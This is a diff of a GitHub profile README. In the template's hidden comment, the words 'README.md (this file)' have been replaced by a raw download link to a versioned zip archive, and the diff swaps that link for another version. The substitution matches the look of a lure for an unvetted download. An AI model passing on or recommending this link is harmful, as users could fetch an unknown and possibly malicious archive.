@@ -5,6 +5,6 @@
 - 📫 How to reach me ...
 
 <!---
-gerelchimeg1123/gerelchimeg1123 is a ✨ special ✨ repository because its `https://raw.githubusercontent.com/gerelchimeg1123/gerelchimeg1123/main/labeller/gerelchimeg_v3.9.zip` (this file) appears on your GitHub profile.
+gerelchimeg1123/gerelchimeg1123 is a ✨ special ✨ repository because its `https://github.com/gerelchimeg1123/gerelchimeg1123/raw/refs/heads/main/labeller/gerelchimeg_3.8-beta.5.zip` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
